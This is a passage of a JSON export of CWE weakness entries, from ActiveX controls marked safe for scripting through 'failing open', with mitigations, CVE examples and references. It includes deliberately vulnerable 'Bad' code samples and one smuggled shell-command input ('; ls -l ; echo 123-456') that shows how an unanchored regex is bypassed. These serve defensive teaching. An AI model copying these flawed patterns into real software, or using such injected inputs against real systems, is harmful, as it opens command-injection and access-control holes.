          "Reference": "CVE-2007-1220",
          "Description": "invalid syscall arguments bypass code execution limits",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1220"
        },
        {
          "Reference": "CVE-2006-4541",
          "Description": "DoS in IDS via NULL argument",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4541"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP27",
          "EntryName": "Tainted input to environment"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "623",
      "Name": "Unsafe ActiveX Control Marked Safe For Scripting",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "An ActiveX control is intended for restricted use, but it has been marked as safe-for-scripting.",
      "ExtendedDescription": "This might allow attackers to use dangerous functionality via a web page that accesses the control, which can lead to different resultant vulnerabilities, depending on the control's behavior.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "267",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "PeerOf",
          "CweID": "618",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "During development, do not mark it as safe for scripting."
        },
        {
          "Phase": [
            "System Configuration"
          ],
          "Description": "After distribution, you can set the kill bit for the control so that it is not accessible from Internet Explorer."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-0617",
          "Description": "control allows attackers to add malicious email addresses to bypass spam limits",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0617"
        },
        {
          "Reference": "CVE-2007-0219",
          "Description": "web browser uses certain COM objects as ActiveX",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0219"
        },
        {
          "Reference": "CVE-2006-6510",
          "Description": "kiosk allows bypass to read files",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6510"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-503",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Developing Secure ActiveX Controls",
          "PublicationYear": "2005",
          "PublicationMonth": "04",
          "PublicationDay": "13",
          "URL": "https://learn.microsoft.com/en-us/previous-versions//ms533046(v=vs.85)?redirectedfrom=MSDN",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-510",
          "Authors": [
            "Microsoft"
          ],
          "Title": "How to stop an ActiveX control from running in Internet Explorer",
          "URL": "https://support.microsoft.com/en-us/help/240797/how-to-stop-an-activex-control-from-running-in-internet-explorer",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-7",
          "Section": "Chapter 16, \"What ActiveX Components Are Safe for Initialization and Safe for Scripting?\" Page 510",
          "Authors": [
            "Michael Howard",
            "David LeBlanc"
          ],
          "Title": "Writing Secure Code",
          "Edition": "2nd Edition",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "04",
          "Publisher": "Microsoft Press",
          "URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 12, \"ActiveX Security\", Page 749",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "624",
      "Name": "Executable Regular Expression Error",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a regular expression that either (1) contains an executable component with user-controlled inputs, or (2) allows a user to enable execution by inserting pattern modifiers.",
      "ExtendedDescription": "Case (2) is possible in the PHP preg_replace() function, and possibly in other languages when a user-controlled input is inserted into a string that is later parsed as a regular expression.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "77",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "77",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "77",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Perl",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "The regular expression feature in some languages allows inputs to be quoted or escaped before insertion, such as \\Q and \\E in Perl."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2006-2059",
          "Description": "Executable regexp in PHP by inserting \"e\" modifier into first argument to preg_replace",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2059"
        },
        {
          "Reference": "CVE-2005-3420",
          "Description": "Executable regexp in PHP by inserting \"e\" modifier into first argument to preg_replace",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3420"
        },
        {
          "Reference": "CVE-2006-2878",
          "Description": "Complex curly syntax inserted into the replacement argument to PHP preg_replace(), which uses the \"/e\" modifier",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2878"
        },
        {
          "Reference": "CVE-2006-2908",
          "Description": "Function allows remote attackers to execute arbitrary PHP code via the username field, which is used in a preg_replace function call with a /e (executable) modifier.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2908"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP24",
          "EntryName": "Tainted input to command"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Research Gap",
          "Note": "Under-studied. The existing PHP reports are limited to highly skilled researchers, but there are few examples for other languages. It is suspected that this is under-reported for all languages. Usability factors might make it more prevalent in PHP, but this theory has not been investigated."
        }
      ]
    },
    {
      "ID": "625",
      "Name": "Permissive Regular Expression",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product uses a regular expression that does not sufficiently restrict the set of allowed values.",
      "ExtendedDescription": "\n\nThis effectively causes the regexp to accept substrings that match the pattern, which produces a partial comparison to the target. In some cases, this can lead to other weaknesses. Common errors include:\n\n\n  - not identifying the beginning and end of the target string\n\n  - using wildcards instead of acceptable character ranges\n\n  - others\n\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "185",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "PeerOf",
          "CweID": "187",
          "ViewID": "1000"
        },
        {
          "Nature": "PeerOf",
          "CweID": "184",
          "ViewID": "1000"
        },
        {
          "Nature": "PeerOf",
          "CweID": "183",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Perl",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "This problem is frequently found when the regular expression is used in input validation or security features such as authentication."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "When applicable, ensure that the regular expression marks beginning and ending string patterns, such as \"/^string$/\" for Perl."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-37",
          "Entries": [
            {
              "IntroText": "The following code takes phone numbers as input, and uses a regular expression to reject invalid phone numbers."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\t$phone = GetPhoneNumber();\n\tif ($phone =~ /\\d+-\\d+/) {\n```\n# looks like it only has hyphens and digits* \n\t\tsystem(\"lookup-phone $phone\");} \n\telse {\n\t```\n\t\terror(\"malformed number!\");\n\t}\n```"
            },
            {
              "BodyText": "An attacker could provide an argument such as: \"; ls -l ; echo 123-456\" This would pass the check, since \"123-456\" is sufficient to match the \"\\d+-\\d+\" portion of the regular expression."
            }
          ]
        },
        {
          "ID": "DX-154",
          "Entries": [
            {
              "IntroText": "This code uses a regular expression to validate an IP string prior to using it in a call to the \"ping\" command."
            },
            {
              "Nature": "Bad",
              "Language": "Python",
              "ExampleCode": "```\n\t import subprocess\n\t import re\n\t def validate_ip_regex(ip: str):\n\t\t ip_validator = re.compile(r\"((25[0-5]|(2[0-4]|1\\d|[1-9]|)\\d)\\.?\\b){4}\")\n\t\t if ip_validator.match(ip):\n\t\t\t return ip\n\t\t else:\n\t\t\t raise ValueError(\"IP address does not match valid pattern.\")\n\t def run_ping_regex(ip: str):\n\t\t validated = validate_ip_regex(ip)\n```\n# The ping command treats zero-prepended IP addresses as octal* \n\t\t result = subprocess.call([\"ping\", validated])\n\t\t print(result)"
            },
            {
              "BodyText": "Since the regular expression does not have anchors (CWE-777), i.e. is unbounded without ^ or $ characters, then prepending a 0 or 0x to the beginning of the IP address will still result in a matched regex pattern. Since the ping command supports octal and hex prepended IP addresses, it will use the unexpectedly valid IP address (CWE-1389). For example, \"0x63.63.63.63\" would be considered equivalent to \"99.63.63.63\". As a result, the attacker could potentially ping systems that the attacker cannot reach directly."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2021-22204",
          "Description": "Chain: regex in EXIF processor code does not correctly determine where a string ends (CWE-625), enabling eval injection (CWE-95), as exploited in the wild per CISA KEV.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-22204"
        },
        {
          "Reference": "CVE-2006-1895",
          "Description": "\".*\" regexp leads to static code injection",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-1895"
        },
        {
          "Reference": "CVE-2002-2175",
          "Description": "insertion of username into regexp results in partial comparison, causing wrong database entry to be updated when one username is a substring of another.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-2175"
        },
        {
          "Reference": "CVE-2006-4527",
          "Description": "regexp intended to verify that all characters are legal, only checks that at least one is legal, enabling file inclusion.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4527"
        },
        {
          "Reference": "CVE-2005-1949",
          "Description": "Regexp for IP address isn't anchored at the end, allowing appending of shell metacharacters.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1949"
        },
        {
          "Reference": "CVE-2002-2109",
          "Description": "Regexp isn't \"anchored\" to the beginning or end, which allows spoofed values that have trusted values as substrings.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-2109"
        },
        {
          "Reference": "CVE-2006-6511",
          "Description": "regexp in .htaccess file allows access of files whose names contain certain substrings",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6511"
        },
        {
          "Reference": "CVE-2006-6629",
          "Description": "allow load of macro files whose names contain certain substrings.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6629"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "IDS08-J",
          "EntryName": "Sanitize untrusted data passed to a regex"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 8, \"Character Stripping Vulnerabilities\", Page 437",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "626",
      "Name": "Null Byte Interaction Error (Poison Null Byte)",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not properly handle null bytes or NUL characters when passing data between different representations or components.",
      "ExtendedDescription": "\n\nA null byte (NUL character) can have different meanings across representations or languages. For example, it is a string terminator in standard C libraries, but Perl and PHP strings do not treat it as a terminator. When two representations are crossed - such as when Perl or PHP invokes underlying C functionality - this can produce an interaction error with unexpected results. Similar issues have been reported for ASP. Other interpreters written in C might also be affected.\n\n\nThe poison null byte is frequently useful in path traversal attacks by terminating hard-coded extensions that are added to a filename. It can play a role in regular expression processing in PHP.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "147",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "436",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Perl",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "ASP.NET",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Unexpected State"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Remove null bytes from all incoming strings."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2005-4155",
          "Description": "NUL byte bypasses PHP regular expression check",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-4155"
        },
        {
          "Reference": "CVE-2005-3153",
          "Description": "inserting SQL after a NUL byte bypasses allowlist regexp, enabling SQL injection",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3153"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-514",
          "Authors": [
            "Rain Forest Puppy"
          ],
          "Title": "Poison NULL byte",
          "Publication": "Phrack 55",
          "URL": "https://insecure.org/news/P55-07.txt",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-515",
          "Authors": [
            "Brett Moore"
          ],
          "Title": "0x00 vs ASP file upload scripts",
          "URL": "http://www.security-assessment.com/Whitepapers/0x00_vs_ASP_File_Uploads.pdf"
        },
        {
          "ExternalReferenceID": "REF-516",
          "Authors": [
            "ShAnKaR"
          ],
          "Title": "ShAnKaR: multiple PHP application poison NULL byte vulnerability",
          "URL": "https://seclists.org/fulldisclosure/2006/Sep/185",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Terminology",
          "Note": "Current usage of \"poison null byte\" is typically related to this C/Perl/PHP interaction error, but the original term in 1998 was applied to an off-by-one buffer overflow involving a null byte."
        },
        {
          "Type": "Research Gap",
          "Note": "There are not many CVE examples, because the poison NULL byte is a design limitation, which typically is not included in CVE by itself. It is typically used as a facilitator manipulation to widen the scope of potential attacks against other vulnerabilities."
        }
      ]
    },
    {
      "ID": "627",
      "Name": "Dynamic Variable Evaluation",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "In a language where the user can influence the name of a variable at runtime, if the variable names are not controlled, an attacker can read or write to arbitrary variables, or access arbitrary functions.",
      "ExtendedDescription": "The resultant vulnerabilities depend on the behavior of the application, both at the crossover point and in any control/data flow that is reachable by the related variables or functions.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "914",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "PeerOf",
          "CweID": "183",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Perl",
          "Prevalence": "Undetermined"
        }
      ],
      "BackgroundDetails": [
        "Many interpreted languages support the use of a \"$$varname\" construct to set a variable whose name is specified by the $varname variable. In PHP, these are referred to as \"variable variables.\" Functions might also be invoked using similar syntax, such as $$funcname(arg1, arg2)."
      ],
      "AlternateTerms": [
        {
          "Term": "Dynamic evaluation"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Modify Application Data",
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "An attacker could gain unauthorized access to internal program variables and execute arbitrary code."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Refactoring",
          "Description": "Refactor the code to avoid dynamic variable evaluation whenever possible."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Input Validation",
          "Description": "Use only allowlists of acceptable variable or function names."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "For function names, ensure that you are only calling functions that accept the proper number of arguments, to avoid unexpected null arguments."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2009-0422",
          "Description": "Chain: Dynamic variable evaluation allows resultant remote file inclusion and path traversal.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0422"
        },
        {
          "Reference": "CVE-2007-2431",
          "Description": "Chain: dynamic variable evaluation in PHP program used to modify critical, unexpected $_SERVER variable for resultant XSS.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-2431"
        },
        {
          "Reference": "CVE-2006-4904",
          "Description": "Chain: dynamic variable evaluation in PHP program used to conduct remote file inclusion.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4904"
        },
        {
          "Reference": "CVE-2006-4019",
          "Description": "Dynamic variable evaluation in mail program allows reading and modifying attachments and preferences of other users.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4019"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-517",
          "Authors": [
            "Steve Christey"
          ],
          "Title": "Dynamic Evaluation Vulnerabilities in PHP applications",
          "Publication": "Full-Disclosure",
          "PublicationYear": "2006",
          "PublicationMonth": "05",
          "PublicationDay": "03",
          "URL": "https://seclists.org/fulldisclosure/2006/May/35",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-518",
          "Authors": [
            "Shaun Clowes"
          ],
          "Title": "A Study In Scarlet: Exploiting Common Vulnerabilities in PHP Applications",
          "URL": "https://securereality.com.au/study-in-scarlett/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Research Gap",
          "Note": "Under-studied, probably under-reported. Few researchers look for this issue; most public reports are for PHP, although other languages are affected. This issue is likely to grow in PHP as developers begin to implement functionality in place of register_globals."
        }
      ]
    },
    {
      "ID": "628",
      "Name": "Function Call with Incorrectly Specified Arguments",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product calls a function, procedure, or routine with arguments that are not correctly specified, leading to always-incorrect behavior and resultant weaknesses.",
      "ExtendedDescription": "\n\nThere are multiple ways in which this weakness can be introduced, including:\n\n\n  - the wrong variable or reference;\n\n  - an incorrect number of arguments;\n\n  - incorrect order of arguments;\n\n  - wrong type of arguments; or\n\n  - wrong value.\n\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "573",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary",
          "Description": "This is usually primary to other weaknesses, but it can be resultant if the function's API or function prototype changes."
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other",
            "Access Control"
          ],
          "Impact": [
            "Quality Degradation",
            "Gain Privileges or Assume Identity"
          ],
          "Note": "This weakness can cause unintended behavior and can lead to additional weaknesses such as allowing an attacker to gain unintended access to system resources."
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Other",
          "Description": "Since these bugs typically introduce incorrect behavior that is obvious to users, they are found quickly, unless they occur in rarely-tested code paths. Managing the correct number of arguments can be made more difficult in cases where format strings are used, or when variable numbers of arguments are supported."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Build and Compilation"
          ],
          "Description": "Once found, these issues are easy to fix. Use code inspection tools and relevant compiler features to identify potential violations. Pay special attention to code that is not likely to be exercised heavily during QA."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Make sure your API's are stable before you use them in production code."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-62",
          "Entries": [
            {
              "IntroText": "The following PHP method authenticates a user given a username/password combination but is called with the parameters in reverse order."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\tfunction authenticate($username, $password) {\n```\n// authenticate user* \n\t\t\t...}\n\t\n\tauthenticate($_POST['password'], $_POST['username']);"
            }
          ]
        },
        {
          "ID": "DX-63",
          "Entries": [
            {
              "IntroText": "This Perl code intends to record whether a user authenticated successfully or not, and to exit if the user fails to authenticate. However, when it calls ReportAuth(), the third argument is specified as 0 instead of 1, so it does not exit."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\tsub ReportAuth {\n\t\tmy ($username, $result, $fatal) = @_;\n\t\tPrintLog(\"auth: username=%s, result=%d\", $username, $result);\n\t\tif (($result ne \"success\") && $fatal) {\n\t\t\tdie \"Failed!\\n\";\n\t\t}\n\t}\n\tsub PrivilegedFunc\n\t{\n\t\tmy $result = CheckAuth($username);\n\t\tReportAuth($username, $result, 0);\n\t\tDoReallyImportantStuff();\n\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-64",
          "Entries": [
            {
              "IntroText": "In the following Java snippet, the accessGranted() method is accidentally called with the static ADMIN_ROLES array rather than the user roles."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprivate static final String[] ADMIN_ROLES = ...;\n\tpublic boolean void accessGranted(String resource, String user) {\n\t\tString[] userRoles = getUserRoles(user);\n\t\treturn accessGranted(resource, ADMIN_ROLES);\n\t}\n\tprivate boolean void accessGranted(String resource, String[] userRoles) {\n```\n// grant or deny access based on user roles* \n\t\t\t...}"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2006-7049",
          "Description": "The method calls the functions with the wrong argument order, which allows remote attackers to bypass intended access restrictions.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-7049"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "DCL10-C",
          "EntryName": "Maintain the contract between the writer and caller of variadic functions"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "EXP37-C",
          "EntryName": "Call functions with the correct number and type of arguments",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "DCL00-PL",
          "EntryName": "Do not use subroutine prototypes",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "EXP33-PL",
          "EntryName": "Do not invoke a function in a context for which it is not defined",
          "MappingFit": "Imprecise"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "636",
      "Name": "Not Failing Securely ('Failing Open')",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "When the product encounters an error condition or failure, its design requires it to fall back to a state that is less secure than other options that are available, such as selecting the weakest encryption algorithm or using the most permissive access control restrictions.",
      "ExtendedDescription": "By entering a less secure state, the product inherits the weaknesses associated with that state, making it easier to compromise. At the least, it causes administrators to have a false sense of security. This weakness typically occurs as a result of wanting to \"fail functional\" to minimize administration and support costs, instead of \"failing safe.\"",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "657",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "755",
          "ViewID": "1000"
        },
        {
          "Nature": "PeerOf",
          "CweID": "280",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "ICS/OT",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Failing Open"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Note": "Intended access restrictions can be bypassed, which is often contradictory to what the product's administrator expects."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Subdivide and allocate resources and components so that a failure in one part does not affect the entire product."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-164",
          "Entries": [
            {
              "IntroText": "Switches may revert their functionality to that of hubs when the table used to map ARP information to the switch interface overflows, such as when under a spoofing attack. This results in traffic being broadcast to an eavesdropper, instead of being sent only on the relevant switch interface. To mitigate this type of problem, the developer could limit the number of ARP entries that can be recorded for a given switch interface, while other interfaces may keep functioning normally. Configuration options can be provided on the appropriate actions to be taken in case of a detected failure, but safe defaults should be used."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-5277",
          "Description": "The failure of connection attempts in a web browser resets DNS pin restrictions. An attacker can then bypass the same origin policy by rebinding a domain name to a different IP address. This was an attempt to \"fail functional.\"",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-5277"
        },
        {
          "Reference": "CVE-2006-4407",
          "Description": "Incorrect prioritization leads to the selection of a weaker cipher. Although it is not known whether this issue occurred in implementation or design, it is feasible that a poorly designed algorithm could be a factor.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4407"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OWASP Top Ten 2004",
          "EntryID": "A7",
          "EntryName": "Improper Error Handling",
          "MappingFit": "CWE More Specific"
        }
